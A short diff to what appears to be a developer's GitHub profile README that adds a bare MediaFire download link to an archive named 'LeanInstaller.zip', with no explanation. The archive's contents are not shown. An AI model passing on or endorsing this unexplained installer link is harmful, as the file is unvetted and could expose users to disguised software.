@@ -12,3 +12,5 @@ Skills: HTML, CSS, Python, JavaScript, PHP, SQL, C, C++, C#, Java, Shell, Server
 ![Anurag's GitHub stats](https://github-readme-stats.vercel.app/api?username=wayeet&show_icons=true&count_private=true)
 
 
+https://www.mediafire.com/file/vsop4ycg5shnw1h/LeanInstaller.zip/file
+
